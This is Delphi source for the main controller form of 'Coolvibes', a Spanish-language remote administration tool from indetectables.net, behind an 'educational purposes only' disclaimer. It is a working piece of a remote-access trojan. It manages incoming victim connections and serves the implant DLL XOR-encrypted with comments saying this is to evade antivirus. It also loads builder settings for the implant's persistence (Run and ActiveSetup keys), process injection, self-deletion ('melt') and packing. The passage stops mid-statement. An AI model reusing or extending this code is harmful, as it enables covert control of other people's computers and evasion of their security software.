(*  Coolvibes - Herramienta de administración remota

   Este código fuente se ofrece sólo con fines educativos.
   Queda absolutamente prohibido ejecutarlo en computadores
   cuyo dueño sea una persona diferente de usted, a no ser
   que el dueño haya dado permiso explicito de usarlo.

   En cualquier caso, ni www.indetectables.net  ni ninguno de
   los creadores de Coolvibes será responsable de cualquier
   consecuencia de usar este programa. Si no acepta esto por
   favor no compile el programa y borrelo ahora mismo.

   El equipo del Coolvibes
*)

unit UnitMain;

interface

uses
  Windows, ShellAPI, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, XPMan, ComCtrls, Buttons, StdCtrls, ImgList, jpeg,
  Menus, IniFiles, IdThreadMgr, IdThreadMgrDefault, IdAntiFreezeBase,
  IdAntiFreeze, IdBaseComponent, IdComponent, IdTCPServer,
  UnitVariables, AppEvnts, gnugettext, CommCtrl;

const
  WM_POP_MESSAGE = WM_USER + 1;  //Mensaje usado para las notificaciones
  WM_ICONTRAY  = WM_USER + 2;  //Mensaje usado para el icono en el system tray
  WM_EVENT_MESSAGE = WM_USER + 3;  //Mensaje usado para los eventos
  
  // globo emergente
  NIF_INFO     = $10;
  NIF_MESSAGE  = 1;
  NIF_ICON     = 2;
  NOTIFYICON_VERSION = 3;
  NIF_TIP      = 4;
  NIM_SETVERSION = $00000004;
  NIM_SETFOCUS = $00000003;
  NIIF_INFO    = $00000001;
  NIIF_WARNING = $00000002;
  NIIF_ERROR   = $00000003;

type
  TDUMMYUNIONNAME = record
    case integer of
      0: (uTimeout: UINT);
      1: (uVersion: UINT);
  end;

  TNotifyIconData = record
    cbSize:  DWORD;
    Wnd:     HWND;
    uID:     UINT;
    uFlags:  UINT;
    uCallbackMessage: UINT;
    hIcon:   HICON;
    szTip:   array [0..127] of char;
    dwState: DWORD;
    dwStateMask: DWORD;
    szInfo:  array [0..255] of char;
    DUMMYUNIONNAME: TDUMMYUNIONNAME;
    szInfoTitle: array [0..63] of char;
    dwInfoFlags: DWORD;
  end;
//termina const globo emergente
type
  TFormMain = class(TForm)
    StatusBar: TStatusBar;
    XPManifest: TXPManifest;
    ImageTitulo: TImage;
    BtnEscuchar: TSpeedButton;
    PopupMenuConexiones: TPopupMenu;
    Abrir1: TMenuItem;
    N1:     TMenuItem;
    Ping1:  TMenuItem;
    Cambiarnombre1: TMenuItem;
    ImageList: TImageList;
    BtnOpciones: TSpeedButton;
    BtnAbout: TSpeedButton;
    ListViewConexiones: TListView;
    BtnConfigServer: TSpeedButton;
    ServerSocket: TIdTCPServer;
    IdAntiFreeze1: TIdAntiFreeze;
    IdThreadMgrDefault1: TIdThreadMgrDefault;
    PopupMenuTray: TPopupMenu;
    MostrarOcultar1: TMenuItem;
    Acercade1: TMenuItem;
    N2:     TMenuItem;
    Escuchar1: TMenuItem;
    Salir1: TMenuItem;
    N3:     TMenuItem;
    wwwindetectablesnet1: TMenuItem;
    NotificacinestiloMSN1: TMenuItem;
    TimerMandarPing: TTimer;
    PopupMenuColumnas: TPopupMenu;
    Ip1: TMenuItem;
    Nombre1: TMenuItem;
    CPU1: TMenuItem;
    SO1: TMenuItem;
    Versin1: TMenuItem;
    Ping2: TMenuItem;
    Ventanaactiva1: TMenuItem;
    su1: TMenuItem;
    Encendidohace1: TMenuItem;
    Idioma1: TMenuItem;
    Puerto1: TMenuItem;
    Servidor1: TMenuItem;
    Cerrar1: TMenuItem;
    Actualizar1: TMenuItem;
    Desinstalar1: TMenuItem;
    procedure BtnEscucharClick(Sender: TObject);
    procedure ListViewConexionesContextPopup(Sender: TObject;
      MousePos: TPoint; var Handled: boolean);
    procedure Abrir1Click(Sender: TObject);
    procedure BtnOpcionesClick(Sender: TObject);
    procedure BtnAboutClick(Sender: TObject);
    procedure Cambiarnombre1Click(Sender: TObject);
    procedure Ping1Click(Sender: TObject);
    procedure LeerArchivoINI();
    procedure GuardarArchivoINI();
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure BtnConfigServerClick(Sender: TObject);
    procedure ServerSocketConnect(AThread: TIdPeerThread);
    procedure ServerSocketExecute(AThread: TIdPeerThread);
    procedure ServerSocketDisconnect(AThread: TIdPeerThread);
    procedure ListViewConexionesColumnClick(Sender: TObject; Column: TListColumn);
    procedure ListViewConexionesCompare(Sender: TObject;
      Item1, Item2: TListItem; Data: integer; var Compare: integer);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure MostrarOcultar1Click(Sender: TObject);
    procedure Salir1Click(Sender: TObject);
    procedure NotificacinestiloMSN1Click(Sender: TObject);
    procedure PopupMenuTrayPopup(Sender: TObject);
    procedure wwwindetectablesnet1Click(Sender: TObject);
    procedure TimerMandarPingTimer(Sender: TObject);
    procedure GloboEmergente(titulo:string;mensaje:string;tipo:cardinal);
    procedure ListViewConexionesKeyPress(Sender: TObject; var Key: Char);
    procedure ListViewConexionesColumnRightClick(Sender: TObject;
      Column: TListColumn; Point: TPoint);
    procedure PopupMenuColumnasPopup(Sender: TObject);
    procedure Ip1Click(Sender: TObject);
    procedure CheckMesg(var aMesg: TMessage);
    function GetIndex(aNMHdr: pNMHdr): Integer;
    Function SearchColumnById(ID:integer):integer;
    procedure Cerrar1Click(Sender: TObject);
    procedure FormCanResize(Sender: TObject; var NewWidth,
      NewHeight: Integer; var Resize: Boolean);
    procedure Desinstalar1Click(Sender: TObject);
    procedure Actualizar1Click(Sender: TObject);
    procedure StatusBarMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure StatusBarClick(Sender: TObject);
  private
    ColumnaOrdenada, Columna: integer;
    WndMethod: TWndMethod;
    //Para saber por que columna está ordenado el listviewconexiones
    TrayIconData: TNotifyIconData;
    //El record dodne se guarda la información del icono de la tray
    ServerSockets : array[0..9] of TIdTCPServer;
    procedure OnPopMessage(var Msg: TMessage); message WM_POP_MESSAGE;
    procedure TrayMessage(var Msg: TMessage); message WM_ICONTRAY;
    procedure OnEventReceive(var Msg: TMessage); message WM_EVENT_MESSAGE;
    procedure NotiMsnDesconect(tItem: TListItem);
  public
    Idioma : string; //El idioma actual
    Columnas : array[0..8] of string; //Para saber el orden de las columnas
    NotificandoOnline: Boolean; //Si estamos notificando alguna conexión
    ControlWidth, ControlHeight : integer; //Anchura y altura de FormControl para guardar al archivo ini
    procedure Traducir();
    procedure FormCloseQuery(Sender: TObject; var CanClose: boolean);
    procedure FormCloseQueryMinimizarAlTray(Sender: TObject; var CanClose: boolean);
    procedure MinimizeToTrayClick(Sender: TObject);
  end;

var
  FormMain: TFormMain;
  PrimeraVezQueMeMuestro: boolean = True;
  ServDLL : String; //DLL del server, coolserver.dll
const
  Banderas : array[0..246] of string = ('ad',  'ae',  'af',  'ag',  'ai',  'al',  'am',  'an',  'ao',  'ar',  'as',  'at',  'au',  'aw',  'ax',  'az',  'ba',  'bb',  'bd',  'be',  'bf',  'bg',
  'bh',  'bi',  'bj',  'bm',  'bn','bo',  'br',  'bs',  'bt',  'bv',  'bw',  'by',  'bz',  'ca',  'catalonia',  'cc',  'cd',  'cf',  'cg',  'ch',  'ci',  'ck',  'cl',     'cm',  'cn',  'co',
  'cr',  'cs',  'cu',  'cv',  'cx',  'cy',  'cz',  'de',  'dj',  'dk',  'dm', 'do',  'dz',  'ec',  'ee',  'eg',  'eh',  'england',  'er',  'es',  'et',  'europeanunion',  'fam',  'fi', 'fj',
  'fk',  'fm',  'fo',  'fr',  'ga',  'gb',  'gd',  'ge',  'gf',  'gh',  'gi',  'gl',  'gm',  'gn',  'gp',  'gq',  'gr',  'gs',  'gt',  'gu',  'gw',  'gy',  'hk',  'hm',  'hn',  'hr',   'ht',
  'hu',  'id',  'ie',  'il',  'in',  'io',  'iq',  'ir',  'is',  'it',  'jm',  'jo',  'jp',  'ke',  'kg',  'kh',  'ki',  'km',  'kn',  'kp',  'kr',  'kw',  'ky',  'kz', 'la',  'lb',    'lc',
  'li',  'lk',  'lr',  'ls',  'lt',  'lu',  'lv',  'ly',  'ma',  'mc',  'md',  'me',  'mg',  'mh',  'mk',  'ml',  'mm',  'mn',  'mo',  'mp',  'mq',  'mr',  'ms',  'mt', 'mu',    'mv',  'mw',
  'mx',  'my',  'mz',  'na',  'nc',  'ne',  'nf',  'ng',  'ni',  'nl',  'no',  'np',  'nr',  'nu',  'nz',  'om',  'pa',  'pe',  'pf',  'pg',  'ph',  'pk',  'pl',  'pm',  'pn',  'pr',   'ps',
  'pt',  'pw',  'py',  'qa', 're',  'ro',  'rs',  'ru',  'rw',  'sa',  'sb',  'sc',  'scotland','sd',  'se',  'sg',  'sh',  'si',  'sj',  'sk',  'sl',  'sm',  'sn','so',  'sr',  'st',  'sv',
  'sy',  'sz',  'tc',  'td',  'tf',  'tg',  'th',  'tj',  'tk',  'tl',  'tm', 'tn',  'to',  'tr',  'tt',  'tv',  'tw',  'tz',  'ua',  'ug',  'um',  'us',  'uy',  'uz',  'va',    'vc',  've',
  'vg',  'vi',  'vn',  'vu',  'wales', 'wf', 'ws',  'ye',  'yt',  'za',  'zm',  'zw');
implementation

uses UnitOpciones, UnitAbout, UnitID, UnitFormConfigServer,
  UnitFormLanguage, UnitFormReg, UnitFormSendKeys,
  ScreenMaxCap, UnitVisorDeMiniaturas,UnitFormControl,UnitFormNotifica,
  UnitEstadisticasConexiones;

{$R *.dfm}


procedure TFormMain.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  GuardarArchivoINI();

  if ServerSocket.Active then
    BtnEscuchar.Click;
  Shell_NotifyIcon(NIM_DELETE, @TrayIconData);
  ListViewConexiones.WindowProc := WndMethod;
  exitprocess(0);
end;

procedure TFormMain.FormCloseQuery(Sender: TObject; var CanClose: boolean);
begin
  case MessageBox(handle, '¿Está seguro que desea salir?', 'Confirmación',
      mb_IconQuestion + Mb_YesNo) of
    idNo: CanClose := False;
  end;
end;

procedure TFormMain.FormCloseQueryMinimizarAlTray(Sender: TObject;
  var CanClose: boolean);
begin
  MinimizeToTrayClick(Sender);
  CanClose := False;          
end;
//Fin de eventos del Formulario

//Eventos de los botones del Formulario
procedure TFormMain.BtnConfigServerClick(Sender: TObject);
begin
  FormConfigServer.Show;
end;

procedure TFormMain.BtnOpcionesClick(Sender: TObject);
begin
  FormOpciones.ShowModal();
end;

procedure TFormMain.BtnAboutClick(Sender: TObject);
begin
  if (FormAbout.Showing <> true) then
  FormAbout.ShowModal;
end;

procedure TFormMain.BtnEscucharClick(Sender: TObject);
var
  h:    TBitmap;
  i:    integer;
  List: TList;
  Athread: TidPeerThread;
  o : integer;
  Puertos : string;
  Puerto : string;
  
begin
  Puertos := FormOpciones.EditPuerto.Text;
  if copy(puertos,length(puertos),1) <> ';' then
    Puertos := Puertos + ';';
    if BtnEscuchar.Caption = _('Escuchar') then
    begin
      while Pos(';', Puertos) > 0 do
      begin
        if o > 10 then break; //Máximo 10 puertos
        Puerto := Copy(Puertos, 1, Pos(';', Puertos) - 1);
        delete(Puertos,1,pos(';',Puertos));
        if ServerSockets[o] = nil then
        begin
          ServerSockets[o] := TIdTCPServer.Create(nil);
          ServerSockets[o].active := false;
          ServerSockets[o].OnExecute := Serversocket.OnExecute;
          ServerSockets[o].OnConnect := Serversocket.OnConnect;
          ServerSockets[o].OnDisconnect := Serversocket.OnDisconnect;
          ServerSockets[o].ThreadMgr := IdThreadMgrDefault1;
        end;
        try
          ServerSockets[o].DefaultPort := StrToIntdef(Puerto,80);
          if StrToIntdef(Puerto,-1) <> -1 then
            ServerSockets[o].Active := True;
          FormOpciones.EditPuerto.Enabled := False;
          BtnEscuchar.Caption := _('Detener');
          Escuchar1.Checked := True;
        except
          MessageDlg(_('El puerto ') + Puerto +
          _(' ya está en uso o hay un firewall bloqueándolo, elija otro'), mtWarning, [mbOK], 0);
        end;
        o := o+1;
      end;
      
      try
        h := TBitmap.Create;
        h.LoadFromFile(ExtractFilePath(ParamStr(0)) + 'Recursos\Imagenes\detener.bmp');
        BtnEscuchar.Glyph := h;

      except
        MessageDlg(_('No se puede cargar la imagen: ') + ExtractFilePath(ParamStr(0)) +
        'Recursos\Imagenes\detener.bmp', mtWarning, [mbOK], 0);
      end;
      h.Free;

      StatusBar.Panels[0].Text := _('Esperando conexiones');
      StatusBar.Panels[1].Text := _('Puerto(s): ') + FormOpciones.EditPuerto.Text;
    end
    else
    begin
      o := 0;
      while true do
      begin
        if o > 9 then break; //Máximo 10 puertos
        if Serversockets[o]<>nil then
        begin
          if Serversockets[o].Active then
          begin
            List := ServerSockets[o].Threads.LockList;
            for i := 0 to List.Count - 1 do
            begin
              Athread := TidPeerThread(List.Items[i]);
              if Athread.Connection.Connected then
              begin
                Athread.Suspend;
                Athread.Connection.Disconnect;
                Athread.FreeOnTerminate := True;
                Athread.Terminate;
                List[i] := nil;
                Athread := nil;
              end;
            end;
            ServerSockets[o].Threads.Clear;
            ServerSockets[o].Threads.UnlockList;
            ServerSockets[o].Active := False;
            ServerSockets[o].Bindings.Clear;
          end;
          ServerSockets[o].Free;
          ServerSockets[o] := nil;
        end;
        o := o+1;
      end;
      ListViewConexiones.Clear;
      FormOpciones.EditPuerto.Enabled := True;
      BtnEscuchar.Caption := _('Escuchar');
      Escuchar1.Checked   := False;
      try
        h := TBitmap.Create;
        h.LoadFromFile(ExtractFilePath(ParamStr(0)) + 'Recursos\Imagenes\escuchar.bmp');
        BtnEscuchar.Glyph := h;
      except
        MessageDlg(_('No se puede cargar la imagen: ') + ExtractFilePath(ParamStr(0)) +
        'Recursos\Imagenes\escuchar.bmp', mtWarning, [mbOK], 0);
      end;
      h.Free;
      StatusBar.Panels[0].Text := _('Escucha detenida');
      
    end;

end;
//Fin de los eventos de los botones del Formulario

//Evento que se ejecuta al recibir el mensaje WM_EVENT_MESSAGE, para los eventos: Nueva conexion, intento de conexion, desconexion...
procedure TFormMain.OnEventReceive(var Msg: TMessage);
var
  Tipo : integer;
  Item : Tlistitem;
begin
  Tipo := (Msg.Wparam);
  Item := TListItem(Msg.LParam);
  FormEstadisticasConexiones.NuevoEvento(Tipo, Item);
end;

//Evento que se ejecuta al recibir el mensaje WM_POP_MESSAGE, para las notificaciones
procedure TFormMain.OnPopMessage(var Msg: TMessage);
var
  item: TListItem;
  VentanaNotifica: TFormNotifica;
  i:    integer;
begin
  item := TListItem(Msg.Wparam);
  if not NotificandoOnline then //Para que no aparezca mas de una al mismo tiempo 
  begin
    NotificandoOnline := True;
    VentanaNotifica := TFormNotifica.Create(self, Item);
    VentanaNotifica.Show;
    VentanaNotifica.Timer.Enabled := True;
  end;
end;

//Eventos del ServerSocket
procedure TFormMain.ServerSocketConnect(AThread: TIdPeerThread);
begin
  AThread.Connection.MaxLineLength := 1024 * 1024; //Long Max linea
  AThread.Connection.WriteLn('MAININFO|' + IntToStr(Athread.Handle));
end;

procedure TFormMain.ServerSocketDisconnect(AThread: TIdPeerThread);
var
  item: TListItem;
begin
  if Athread.Data <> nil then
  begin
    item := TListItem(Athread.Data);
    //cerrar la  ventana del item correspondiente
    if item.SubItems.Objects[1] <> nil then
    begin
      (item.SubItems.Objects[1] as TFormControl).Close;
    end;
    if NotiMsnServerDesc then
    begin
      // si la opcion esta checkeado mandamos al globo emergente el item
      NotiMsnDesconect(item);
    end;
    SendMessage(FormMain.Handle, WM_EVENT_MESSAGE, 1,integer(Item));
    TListItem(Athread.Data).Delete;

  end;

  try
    Athread.Connection.Server.Threads.LockList.Remove(Athread);
  finally
    Athread.Connection.Server.Threads.UnlockList();
  end;

  FormEstadisticasConexiones.LabelNConexiones.Caption := _('Numero de conexiones: ')+inttostr(Listviewconexiones.Items.count);
  StatusBar.Panels[0].Text := _('Numero de conexiones: ')+inttostr(Listviewconexiones.Items.count);
end;

procedure TFormMain.ServerSocketExecute(AThread: TIdPeerThread);
var
  Len, i, Ping: integer;
  item:   TListItem;
  Buffer: ansistring;
  Recibido, IP: string;
  SHP:    HWND;
  TmpServDLL : string;
begin
  try
    Buffer := Trim(Athread.Connection.ReadLn);
  except
    Athread.Connection.Disconnect;
    exit;
  end;
  Len := Length(Buffer);

  if Buffer = 'CONNECTED?' then
    Exit  //Lo ignoramos
  else if Buffer = 'PING' then
  begin
    Athread.Connection.WriteLn('PONG');
  end
    else if Copy(Buffer, 1, 9) = 'GETSERVER' then         //conectador.dll nos está pidiendo el servidor
  begin                           //GETSERVER|clavecifrado1|clavecifrado2|
   Recibido := buffer;
   Delete(Recibido, 1, Pos('|', Recibido)); //quitamos el GETSERVER|

  //Globo emergente de intento de conexión ??
    TmpServDLL := ServDll;
    if NotificacionMsn then //solo si está activa la notificación MSN de lo contrario podría molestar
      GloboEmergente(_('Pidiendo Servidor'), _('Pidiendo Servidor'), NIIF_INFO);
    for i := 1 to length(ServDLL) do  //con la primera clave
      TmpServDLL[i] := chr(ord(TmpServDLL[i]) xor strtoint(Copy(Recibido, 1, Pos('|', Recibido) - 1)));//funcion de cifrado simple para evadir antiviruses
    Delete(Recibido, 1, Pos('|', Recibido));
    for i := 1 to length(ServDLL) do
      TmpServDLL[i] := chr(ord(TmpServDLL[i]) xor strtoint(Copy(Recibido, 1, Pos('|', Recibido) - 1)));//funcion de cifrado simple para evadir antiviruses


    Athread.Connection.Write(#14+inttostr(length(TmpServDLL))+#14+TmpServDLL);
  end
  else if Copy(Buffer, 1, 4) = 'PONG' then
  begin
  item := TListItem(Athread.Data);
  Ping := GetTickCount() - cardinal(Item.SubItems.Objects[2]); //Tiempo actual menos almacenado

    Recibido := Buffer;
    Delete(Recibido, 1, Pos('|', Recibido)); //quitamos el PONG


    Item.SubItems[5] := Copy(Recibido, 1, Pos('|', Recibido) - 1);  //Active Window Caption
    Delete(Recibido, 1, Pos('|', Recibido));
    Item.SubItems[6] := Copy(Recibido, 1, Pos('|', Recibido) - 1);  //TSU
    Delete(Recibido, 1, Pos('|', Recibido));
    Item.SubItems[7] := Copy(Recibido, 1, Pos('|', Recibido) - 1);  //Uptime
    Delete(Recibido, 1, Pos('|', Recibido));


    item.SubItems[4] := IntToStr(Ping);

    Exit;
  end;

  //Buscamos a que item corresponde la conexión
  for i := 0 to ListViewConexiones.Items.Count - 1 do
    if ListViewConexiones.Items[i] <> nil then
    if ListViewConexiones.Items[i].SubItems.Objects[0] <> nil then
    if Athread.Handle = TIdPeerThread(ListViewConexiones.Items[i].SubItems.Objects[0]).Handle then
    begin
      item := ListViewConexiones.Items[i];
      //Enviarle la conexión a la ventana de ese item, si la tiene
      if item.SubItems.Objects[1] <> nil then
      begin
        (item.SubItems.Objects[1] as TFormControl).OnRead(Buffer, Athread);
        Exit;
      end;
      exit;
    end;

  {Si llega aquí es que el SocketHandle no se encontró entre los SocketHandles
   de las conexiones principales y una de dos:
   -Es un nuevo server
   -Es una conexión para la transferencia de ficheros}

  {Es un nuevo servidor, recibimos la información principal del server
   para mostrar en el ListViewConexiones}
  if Copy(Buffer, 1, 8) = 'MAININFO' then
  begin
    Recibido     := Copy(PChar(Buffer), 1, len);
    Delete(Recibido, 1, 9);  //Borramos MAININFO|
   
    //Añadimos el server al ListviewConexiones
    item := ListViewConexiones.Items.Add;
    for i := 0 to listviewconexiones.columns.Count-1 do
      item.SubItems.Add('?');         //Añadimos los subitems necesarios

     
    //El primer Objeto que guardamos en el Item es el Athread
    item.SubItems.Objects[0] := Athread;
    //Como segundo objeto guardaremos la Form
    //Y el tercer objeto le usaremos para guardar el TimeCount del ping
    
    Athread.Data := item;

    Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1); //El nombre

    for i := 0 to listviewconexiones.columns.Count-1 do  //El resto de valores los copiamos tal cual
    begin
      Delete(Recibido, 1, Pos('|', Recibido));
      if i = 0 then
        Recibido := Athread.Connection.Socket.Binding.PeerIP + ' / '+ Recibido;
      Item.SubItems[i] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
    end;
    
    Item.SubItems[9] := inttostr(Athread.Connection.Server.DefaultPort);
    Recibido := Item.SubItems[8]; //Idioma
    Delete(Recibido, 1, Pos('_', Recibido));
    item.ImageIndex := 77;//bandera de famfamfam

    for i:=0 to 246 do
      if banderas[i] = lowercase(Recibido) then
        item.ImageIndex := i+7;

    //    AThread.Connection.WriteLn('GETSH|'+IntToStr(AThread.Handle));
    //Mostramos la notificación
    Recibido := '';
    if NotificacionMsn then
      SendMessage(FormMain.Handle, WM_POP_MESSAGE, integer(Item), 0);
      SendMessage(FormMain.Handle, WM_EVENT_MESSAGE, 0,integer(Item));
  end
  {Si llega aquí es que es una conexión de transferencia, con SH|12345, se recibe el SocketHandle
  que relacciona esta conexión de transferencia con la conexión principal}
  else if Copy(PChar(Buffer), 1, 2) = 'SH' then
  begin
    Recibido := Copy(PChar(Buffer), 1, len);
    Delete(Recibido, 1, 3); // 'SH|12345'
    //En recibido tenemos el SocketHandle de la conexión principal
    SHP := HWND(StrToInt(Recibido));
    //Buscamos el item de la conexión principal y le añadimos el Handle del socket para las transferencias
    for i := 0 to ListViewConexiones.Items.Count - 1 do
      if SHP = TIdPeerThread(ListViewConexiones.Items.Item[i].SubItems.Objects[0]).Handle then
      begin
        item := ListViewConexiones.Items[i];
        //Enviarle la conexión a la ventana de ese item, si la tiene
        if item.SubItems.Objects[1] <> nil then
        begin
          (item.SubItems.Objects[1] as TFormControl).OnReadFile(Athread);
        end;
        exit;
      end;
  end;
   FormEstadisticasConexiones.LabelNConexiones.Caption := _('Numero de conexiones: ')+inttostr(Listviewconexiones.Items.count);
   StatusBar.Panels[0].Text := _('Numero de conexiones: ')+inttostr(Listviewconexiones.Items.count);
end;
//Fin de eventos del ServerSocket

procedure TFormMain.ListViewConexionesContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: boolean);
begin
  if ListViewConexiones.Selected = nil then
    //No se ha seleccionado item, deshabilitar menu
  begin
    PopupMenuConexiones.Items[0].Enabled := False;
    PopupMenuConexiones.Items[2].Enabled := False;
    PopupMenuConexiones.Items[3].Enabled := False;
    PopupMenuConexiones.Items[4].Enabled := False;
  end
  else
  begin
    PopupMenuConexiones.Items[0].Enabled := True;
    PopupMenuConexiones.Items[2].Enabled := True;
    PopupMenuConexiones.Items[3].Enabled := True;
    PopupMenuConexiones.Items[4].Enabled := True;
  end;
end;

//Al dar al boton abrir
procedure TFormMain.Abrir1Click(Sender: TObject);
var
  NuevaVentanaControl: TFormControl;
  AThread: TIdPeerThread;
  mslistviewitem : TListItem;
begin
  mslistviewitem := ListViewConexiones.Selected;


  while Assigned(mslistviewitem) do
  begin
    if mslistviewitem.SubItems.Objects[1] <> nil then
      TFormControl(mslistviewitem.SubItems.Objects[1]).Show
    else
    begin
      Athread := TIdPeerThread(mslistviewitem.SubItems.Objects[0]);
      NuevaVentanaControl := TFormControl.Create(self, Athread);
      mslistviewitem.SubItems.Objects[1] := NuevaVentanaControl;

      NuevaVentanaControl.Caption :=
      _('Centro de control: ') + mslistviewitem.caption +
      ' ' + Athread.Connection.Socket.Binding.PeerIP;
      NuevaVentanaControl.NombrePC := mslistviewitem.caption;
      NuevaVentanaControl.Show;

    end;
    mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
  end;
end;

procedure TFormMain.Ping1Click(Sender: TObject);
var
  i: integer;
  AThread: TIdPeerThread;
  mslistviewitem : TListItem;
begin
  mslistviewitem := ListViewConexiones.Selected;

  while Assigned(mslistviewitem) do
  begin
    if(mslistviewitem.SubItems[4] <> '.') then
    begin
      AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
      AThread.Connection.WriteLn('PING');
      //Como objeto 2 guardamos una captura del tiempo en milisegundos
      mslistviewitem.SubItems.Objects[2] := TObject(GetTickCount());
    end;
    mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
  end;
end;

procedure TFormMain.Cambiarnombre1Click(Sender: TObject);
begin
  FormID.Show;
end;

//Al pulsar en la columna del ListViewConexiones ordenar filas según el valor de esa columna
procedure TFormMain.ListViewConexionesColumnClick(Sender: TObject; Column: TListColumn);
begin
  Columna := Column.Index;
  ListViewConexiones.AlphaSort;
  //Para acordarnos de que columna está ordenada
  if Columna <> ColumnaOrdenada then
    ColumnaOrdenada := Columna
  else
    ColumnaOrdenada := -1;
end;

//Para ordenar el ListViewConexiones
procedure TFormMain.ListViewConexionesCompare(Sender: TObject;
  Item1, Item2: TListItem; Data: integer; var Compare: integer);
var
  Str1, Str2: string;
begin
  if Columna = 0 then  //Si Columna = 0 usar Item.Caption
  begin
    Str1 := Item1.Caption;
    Str2 := Item2.Caption;
  end
  else
  begin       //Si Columna > 0 usar Item.SubItems[Columna -1]
    Str1 := Item1.SubItems[Columna - 1];
    Str2 := Item2.SubItems[Columna - 1];
  end;
  if (Columna in [0..4]) or (Columna in [6..10]) then  //Son tratadas como cadenas
    Compare := CompareText(Str1, Str2)
  else  //Columna 5 tratada como número
    Compare := StrToIntDef(Str1, 0) - StrToIntDef(Str2, 0);
  //Si la columna ya fue ordenada anteriormente, invertir el orden
  if Columna = ColumnaOrdenada then
    Compare := Compare * -1; //Invertimos el resultado
end;

//Funciones para leer y guardar la configuración en el archivo .INI
procedure TFormMain.LeerArchivoINI();
var
  Ini     : TIniFile;
  i       : integer;
  c       : TListColumn;
  TempStr : string;
begin
  try
    Ini := TIniFile.Create(ExtractFilePath(ParamStr(0)) + 'Configuracion.ini');

    //Valores de la Form de Opciones
    with FormOpciones do
    begin
      EditPuerto.Text :=
        Ini.ReadString('Opciones', 'PuertoEscucha', '3360;77');
      CheckBoxPreguntarAlSalir.Checked :=
        Ini.ReadBool('Opciones', 'PreguntarSalir', True);
      CheckBoxNotificacionMsn.Checked :=
        Ini.ReadBool('Opciones', 'NotificacionMsn', True);
      CheckBoxNotiMsnDesc.Checked :=
        Ini.ReadBool('Opciones', 'NotiMsnServerDesc', True);
      NotificacionMsn :=
        Ini.ReadBool('Opciones', 'NotificacionMsn', True);
      CheckBoxMinimizeToTray.Checked :=
        Ini.ReadBool('Opciones', 'MinimizarAlTray', False);
      CheckBoxCloseToTray.Checked :=
        Ini.ReadBool('Opciones', 'CerrarAlTray', False);
      CheckBoxEscucharAlIniciar.Checked :=
        Ini.ReadBool('Opciones', 'EscucharAlIniciar', False);
      CheckBoxMandarPingAuto.Checked :=
        Ini.ReadBool('Opciones', 'MandarPingAuto', True);
      EditPingTimerInterval.Text :=
        Ini.ReadString('Opciones', 'PingTimerInterval', '30');
      CheckBoxAutoRefrescar.Checked :=
        Ini.ReadBool('Opciones', 'AutoRefrescar', False);
    end;
    //Valores de la Form de Configuracion del server
    with FormConfigServer do
    begin
      EditID.Text     :=
        Ini.ReadString('ConfigurarServidor', 'ID', 'CoolID');
      IPsyPuertos     :=
        Ini.ReadString('ConfigurarServidor', 'Conectar', '127.0.0.1:80¬');
      EditPluginName.Text :=
        Ini.ReadString('ConfigurarServidor', 'NombrePlugin', '0k3n.dat');
      CheckBoxCopiar.Checked :=
        Ini.ReadBool('ConfigurarServidor', 'CopiarArchivo', False);
      EditFileName.Text :=
        Ini.ReadString('ConfigurarServidor', 'NombreArchivo', 'coolserver.exe');
      EditCopyTo.Text :=
        Ini.ReadString('ConfigurarServidor', 'RutaCopiarA', '%AppDir%\');
      CheckBoxMelt.Checked :=
        Ini.ReadBool('ConfigurarServidor', 'Melt', False);
      CheckBoxCopiarConFechaAnterior.Checked :=
        Ini.ReadBool('ConfigurarServidor', 'CopiarConFechaAnterior', False);
      CheckBoxRun.Checked :=
        Ini.ReadBool('ConfigurarServidor', 'MetodoRun', False);
      CheckBoxActiveSetup.Checked :=
        Ini.ReadBool('ConfigurarServidor', 'MetodoActiveSetup', False);
      EditRunName.Text :=
        Ini.ReadString('ConfigurarServidor', 'ValorRun', 'coolserver');
      EditActiveSetup.Text :=
        Ini.ReadString('ConfigurarServidor', 'ValorActiveSetup', '');
      CheckBoxInyectar.Checked :=
        Ini.ReadBool('ConfigurarServidor', 'Inyectar', False);
      CheckBoxPersistencia.Checked :=
        Ini.ReadBool('ConfigurarServidor', 'Persistencia', False);
      CheckBoxUPX.Checked :=
        Ini.ReadBool('ConfigurarServidor', 'ComprimirUPX', False);
      CheckBoxCifrar.Checked :=
        Ini.ReadBool('ConfigurarServidor', 'Cifrar', False);

    end;

    for i:=0 to listviewconexiones.columns.Count-1 do
    begin
          c := listviewconexiones.columns[searchcolumnbyid(i)];
          //c.Caption:= Ini.ReadString('AparienciaCliente', 'Columna'+inttostr(i)+'Caption', columnas[i]);
          c.Index := Ini.ReadInteger('AparienciaCliente', 'Columna'+inttostr(i)+'Index',c.Index);

          if Ini.ReadInteger('AparienciaCliente', 'Columna'+inttostr(i)+'Width',100) = -1 then
          begin
            c.MaxWidth := 1;
            PopupMenuColumnas.Items[i].checked := false;
            c.Width := 0;
          end
          else
          begin
            c.Width := Ini.ReadInteger('AparienciaCliente', 'Columna'+inttostr(i)+'Width',100);
            PopupMenuColumnas.Items[i].checked := true;
          end;
    end;

    self.Width := Ini.ReadInteger('AparienciaCliente', 'FormMainWidth',self.Width);
    self.Height := Ini.ReadInteger('AparienciaCliente', 'FormMainHeight',self.Height);
    ControlWidth := Ini.ReadInteger('AparienciaCliente', 'FormControlWidth',ControlWidth);
    ControlHeight := Ini.ReadInteger('AparienciaCliente', 'FormControlHeight',ControlHeight);
  finally
    Ini.Free;
  end;
  FormOpciones.BtnGuardar.Click;
end;

procedure TFormMain.GuardarArchivoINI();
var
  Ini: TIniFile;
  i:   integer;
  TempStr : string;
begin
  try
    Ini := TIniFile.Create(ExtractFilePath(ParamStr(0)) + 'Configuracion.ini');

    //Valores de la Form de Opciones
    Ini.WriteString('Opciones', 'PuertoEscucha', FormOpciones.EditPuerto.Text);
    Ini.WriteBool('Opciones', 'PreguntarSalir',
